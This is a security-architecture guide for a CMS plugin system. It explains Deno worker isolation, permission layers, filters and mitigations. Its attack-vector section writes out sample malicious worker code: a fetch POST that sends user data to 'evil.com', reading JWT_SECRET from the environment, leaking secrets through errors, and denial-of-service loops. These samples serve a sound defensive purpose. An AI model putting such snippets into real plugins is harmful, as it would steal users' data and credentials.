# Plugin System Security Architecture

Visual guide to understanding the security model of the plugin system.

---

## Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────────┐
│                           User's Application                             │
│  ┌────────────────────────────────────────────────────────────────────┐ │
│  │                     createCmsHandler({ ... })                       │ │
│  │                                                                      │ │
│  │  plugins: [                                                          │ │
│  │    {                                                                 │ │
│  │      name: 'audit-log',                                              │ │
│  │      worker: new Worker(                                             │ │
│  │        '@drizzle-cms/plugins/audit-log/worker',                      │ │
│  │        { deno: { permissions: { net: ['api.example.com'] } } }      │ │
│  │      ),                                                               │ │
│  │      filter: (ctx) => ctx.hookType === 'action',                    │ │
│  │      config: { webhookUrl: 'https://...' }                          │ │
│  │    }                                                                 │ │
│  │  ]                                                                   │ │
│  └────────────────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────┐
│                          Main Thread (CMS Core)                          │
│  ┌────────────────────────────────────────────────────────────────────┐ │
│  │  PluginService                                                       │ │
│  │  ├─ Filter Context: { hookType, table, action, user }              │ │
│  │  ├─ applyFilter() → filters plugins before execution               │ │
│  │  └─ Decides: Worker message vs in-process call                     │ │
│  └────────────────────────────────────────────────────────────────────┘ │
│                                    │                                     │
│                         ┌──────────┴──────────┐                         │
│                         ▼                     ▼                         │
│  ┌──────────────────────────┐  ┌──────────────────────────────┐       │
│  │  In-Process Plugin       │  │  Worker Executor              │       │
│  │  ├─ Direct function call │  │  ├─ Serialize data            │       │
│  │  ├─ Same thread          │  │  ├─ postMessage(payload)      │       │
│  │  ├─ Fast (no IPC)        │  │  ├─ Timeout timer (5s)        │       │
│  │  └─ Trusted code only    │  │  └─ Pending request tracking  │       │
│  └──────────────────────────┘  └──────────────────────────────┘       │
│                                              │                           │
│  ┌──────────────────────────────────────────┼───────────────────────┐  │
│  │  Database (Never Sent to Workers)        │                       │  │
│  │  ❌ db handle                             │  Security Boundary    │  │
│  │  ❌ server internals                      │  (Worker Isolation)   │  │
│  │  ❌ functions/closures                    │                       │  │
│  │  ✅ Only serializable data crosses ──────┼──────────────────────▶│  │
│  └──────────────────────────────────────────┴───────────────────────┘  │
└─────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────┐
│                        Isolated Worker Thread                            │
│  ┌────────────────────────────────────────────────────────────────────┐ │
│  │  Plugin Worker (audit-log/worker.ts)                                │ │
│  │  ┌────────────────────────────────────────────────────────────────┐ │ │
│  │  │  self.onmessage = async (event) => {                           │ │ │
│  │  │    const { id, type, payload } = event.data;                   │ │ │
│  │  │                                                                 │ │ │
│  │  │    // Only serializable data received                          │ │ │
│  │  │    // ❌ No database access                                     │ │ │
│  │  │    // ❌ No server state access                                 │ │ │
│  │  │    // ✅ Can only use allowed APIs (fetch, crypto, etc.)       │ │ │
│  │  │                                                                 │ │ │
│  │  │    // Process based on type                                    │ │ │
│  │  │    switch (type) {                                             │ │ │
│  │  │      case 'init': /* setup */ break;                           │ │ │
│  │  │      case 'action': await handleAuditAction(payload); break;  │ │ │
│  │  │      case 'transform:beforeSave': /* modify data */ break;    │ │ │
│  │  │    }                                                            │ │ │
│  │  │                                                                 │ │ │
│  │  │    self.postMessage({ id, success: true, result });           │ │ │
│  │  │  };                                                             │ │ │
│  │  └────────────────────────────────────────────────────────────────┘ │ │
│  │                                                                      │ │
│  │  Permissions (Deno):                                                 │ │
│  │  ✅ net: ['api.example.com'] → Can fetch to this host only          │ │
│  │  ❌ read: false → Cannot read files                                  │ │
│  │  ❌ write: false → Cannot write files                                │ │
│  │  ❌ env: false → Cannot access environment variables                 │ │
│  └────────────────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────┐
│                          External Services                               │
│  ┌────────────────────────────────────────────────────────────────────┐ │
│  │  https://api.example.com/audit                                      │ │
│  │  ✅ Only allowed by Worker permissions                              │ │
│  │  ✅ Plugin can POST audit events here                               │ │
│  └────────────────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## Security Layers

### Layer 1: User-Controlled Permissions

```typescript
// User explicitly creates Worker with desired permissions
const worker = new Worker(
  import.meta.resolve('@drizzle-cms/plugins/audit-log/worker'),
  {
    type: 'module',
    deno: { 
      permissions: { 
        net: ['api.example.com'],  // ✅ Only this host
        // Everything else denied by default
      } 
    }
  }
);
```

**Security Benefit**: 
- User has full control
- Principle of least privilege
- Explicit permission grant
- Deny by default

---

### Layer 2: Serializable-Only Data

```typescript
// ✅ What Workers CAN receive
{
  table: 'posts',
  action: 'create',
  user: { sub: 'user-123', role: 'admin' },
  recordId: 42,
  timestamp: '2026-01-22T10:00:00.000Z',
  newData: { title: 'Hello', body: 'World' }
}

// ❌ What Workers CANNOT receive
{
  db: drizzleInstance,           // Function/object with methods
  server: httpServer,            // Class instance
  onComplete: () => {},          // Function
  secret: process.env.JWT_SECRET // Environment variable
}
```

**Security Benefit**:
- Prevents capability leakage
- No function/closure passing
- No database handle exposure
- Immutable snapshots only

---

### Layer 3: Filter Function

```typescript
{
  name: 'audit-log',
  worker: auditWorker,
  filter: (ctx) => {
    // Only audit write operations
    if (!['create', 'update', 'delete'].includes(ctx.action)) {
      return false; // Skip - don't send to Worker
    }
    
    // Skip sensitive tables
    if (['sessions', 'api_keys'].includes(ctx.table)) {
      return false; // Skip - don't send to Worker
    }
    
    // Skip admin users
    if (ctx.user?.role === 'admin') {
      return false; // Skip - don't send to Worker
    }
    
    return true; // Send to Worker
  }
}
```

**Security Benefit**:
- Minimize attack surface
- Reduce data exposure
- Prevent unnecessary processing
- Performance optimization

---

### Layer 4: Type System

```typescript
// Compile-time safety via TypeScript

// ✅ Valid: serializable config
const config: Serializable = { 
  webhookUrl: 'https://example.com',
  maxRetries: 3
};

// ❌ Invalid: won't compile
const config: Serializable = {
  callback: () => {},  // Error: Type 'Function' is not assignable to 'Serializable'
  db: drizzleInstance  // Error: Type has no call signatures
};
```

**Security Benefit**:
- Catch mistakes early
- IDE autocomplete
- Type-safe APIs
- Refactoring safety

---

## Attack Vectors & Mitigations

### ❌ Attack: Malicious Plugin Accesses Database

**Attempt**:
```typescript
// In plugin worker.ts
import { drizzle } from 'drizzle-orm/postgres-js';
const db = drizzle(/* ... */);
await db.select().from(users); // Steal data
```

**Mitigation**: 
- ✅ Workers never receive database handles
- ✅ No database credentials in Worker scope
- ✅ Worker can't import database libraries (permissions)
- ✅ Serializable constraint prevents passing db

**Status**: ✅ **MITIGATED**

---

### ❌ Attack: Plugin Steals Environment Variables

**Attempt**:
```typescript
// In plugin worker.ts
const secret = Deno.env.get('JWT_SECRET'); // Steal secret
throw new Error(`Leaked: ${secret}`);
```

**Mitigation**:
- ✅ Worker permissions don't include `env`
- ✅ Attempt throws: "Requires env access to 'JWT_SECRET'"
- ✅ User explicitly controls env permissions

**Status**: ✅ **MITIGATED**

---

### ❌ Attack: Infinite Loop DoS

**Attempt**:
```typescript
// In plugin worker.ts
self.onmessage = () => {
  while (true) {} // Never respond, tie up resources
};
```

**Mitigation**:
- 🟡 **CURRENT**: 30 second timeout (too long)
- ✅ **AFTER FIX**: 5 second timeout + request limit
- ✅ Worker terminates after timeout
- ✅ Error logged, request continues

**Status**: 🟡 **NEEDS FIX** → See PLUGIN_SYSTEM_REVIEW.md Fix #1

---

### ❌ Attack: Memory Exhaustion

**Attempt**:
```typescript
// In plugin worker.ts
self.onmessage = () => {
  const huge = new Array(1000000000).fill('x'); // Allocate gigabytes
};
```

**Mitigation**:
- 🟡 **CURRENT**: No size limits
- ✅ **AFTER FIX**: 1MB payload limit
- ✅ Validation rejects oversized data
- ✅ Worker isolated (can't crash main thread)

**Status**: 🟡 **NEEDS FIX** → See PLUGIN_SYSTEM_REVIEW.md Fix #3

---

### ❌ Attack: Information Disclosure via Errors

**Attempt**:
```typescript
// In plugin worker.ts
throw new Error(`Secret: ${process.env.JWT_SECRET}`);
```

**Mitigation**:
- 🟡 **CURRENT**: Error passed to main thread unsanitized
- ✅ **AFTER FIX**: Sanitization removes passwords/tokens/keys
- ✅ Errors logged for debugging but sanitized for users

**Status**: 🟡 **NEEDS FIX** → See PLUGIN_SYSTEM_REVIEW.md Fix #2

---

### ❌ Attack: Exfiltrate Data via Network

**Attempt**:
```typescript
// In plugin worker.ts
await fetch('https://evil.com/steal', {
  method: 'POST',
  body: JSON.stringify(ctx.newData) // Send user data to attacker
});
```

**Mitigation**:
- ✅ Worker permissions restrict network hosts
- ✅ Attempt throws: "Requires net access to 'evil.com'"
- ✅ Only allowed hosts can be contacted

**Status**: ✅ **MITIGATED** (if user sets permissions correctly)

**Note**: User must set permissions carefully:
```typescript
// ❌ Bad: Allows any host
deno: { permissions: { net: true } }

// ✅ Good: Restricts to specific host
deno: { permissions: { net: ['api.example.com'] } }
```

---

## Best Practices for Security

### 1. Minimal Permissions

```typescript
// ✅ GOOD: Specific permissions
const worker = new Worker(url, {
  type: 'module',
  deno: { 
    permissions: { 
      net: ['audit.example.com'],  // Only one host
    } 
  }
});

// ❌ BAD: Overly permissive
const worker = new Worker(url, {
  type: 'module',
  deno: { 
    permissions: { 
      net: true,   // Any host
      read: true,  // Any file
      env: true    // Any env var
    } 
  }
});
```

---

### 2. Filter Sensitive Data

```typescript
// ✅ GOOD: Filter prevents exposure
filter: (ctx) => {
  // Don't send sensitive tables to Worker
  if (['sessions', 'api_keys', 'secrets'].includes(ctx.table)) {
    return false;
  }
  return true;
}

// ❌ BAD: No filtering
filter: () => true  // Sends everything to Worker
```

---

### 3. Validate Plugin Configuration

```typescript
// ✅ GOOD: Validate config in plugin
import { z } from 'zod';

const configSchema = z.object({
  webhookUrl: z.string().url(),
  maxRetries: z.number().int().min(0).max(10),
});

export function createPlugin(config: Serializable) {
  const validated = configSchema.parse(config);
  // Use validated.webhookUrl, validated.maxRetries
}

// ❌ BAD: Trust config blindly
export function createPlugin(config: Serializable) {
  const url = config.webhookUrl; // Could be anything!
  await fetch(url); // Could fetch evil.com
}
```

---

### 4. Use In-Process for Trusted Code

```typescript
// ✅ GOOD: In-process for first-party code
{
  name: 'format-names',
  hooks: {
    transform: {
      beforeSave: (ctx, data) => {
        // Runs in main thread - fast, trusted
        return formatData(data);
      }
    }
  }
}

// ⚠️ Worker for third-party code
{
  name: 'community-plugin',
  worker: new Worker(/* ... */),  // Isolated
  config: { /* ... */ }
}
```

---

## Security Checklist

Before deploying plugins to production:

- [ ] ✅ Workers have minimal permissions (not `true`)
- [ ] ✅ Filter function excludes sensitive tables
- [ ] ✅ Plugin configuration is validated
- [ ] ✅ Network hosts are whitelisted, not wildcards
- [ ] ✅ Read/write permissions only if absolutely needed
- [ ] ✅ Error handling doesn't leak sensitive data
- [ ] ✅ Timeout is configured (after Fix #1)
- [ ] ✅ Third-party plugins run in Workers
- [ ] ✅ First-party plugins can run in-process
- [ ] ✅ Audit logging enabled for plugin actions

---

## Further Reading

- **Detailed Review**: [PLUGIN_SYSTEM_REVIEW.md](./PLUGIN_SYSTEM_REVIEW.md)
- **Executive Summary**: [REVIEW_SUMMARY.md](./REVIEW_SUMMARY.md)
- **Implementation Checklist**: [REVIEW_CHECKLIST.md](./REVIEW_CHECKLIST.md)

---

**Created**: 2026-01-22  
**Part of**: Plugin System Peer Review
